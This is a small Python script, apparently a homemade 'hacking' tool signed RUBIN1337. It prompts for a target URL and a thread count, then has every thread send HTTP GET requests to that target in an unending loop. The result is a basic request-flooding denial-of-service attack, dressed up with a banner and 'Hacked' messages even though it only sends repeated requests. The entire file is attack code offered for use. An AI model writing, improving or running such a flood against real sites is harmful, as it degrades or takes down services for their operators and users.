import requests
import threading
import time
import colorama
import random
from colorama import Fore, Style

# Initialize colorama
colorama.init()

# ASCII art with color
ascii_art = f"""{Fore.RED}
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝╚══███╔╝
███████║███████║██║     █████╔╝   ███╔╝ 
██╔══██║██╔══██║██║     ██╔═██╗  ███╔╝  
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝{Style.RESET_ALL}"""

# Function to perform the attack
def hack_target(target_url):
    while True:
        try:
            response = requests.get(target_url)
            if response.status_code == 200:
                print(f"{random.choice([Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA])}[+] Attacked {target_url}, status code: {response.status_code} - Hacked by {Fore.RED}RUBIN1337{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Failed to hack {target_url}, status code: {response.status_code}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to connect to {target_url}: {e}{Style.RESET_ALL}")
        time.sleep(0.1)  # Adjust the delay for faster attacks

if __name__ == "__main__":
    print(ascii_art)
    target_url = input(f"{Fore.YELLOW}[*] Enter target URL: {Style.RESET_ALL}")
    num_threads = int(input(f"{Fore.YELLOW}[*] Enter number of threads: {Style.RESET_ALL}"))

    # Start the attack threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=hack_target, args=(target_url,))
        thread.daemon = True  # Set daemon to True to allow keyboard interrupt
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    print(f"{Fore.CYAN}[+] Attack finished.{Style.RESET_ALL}")
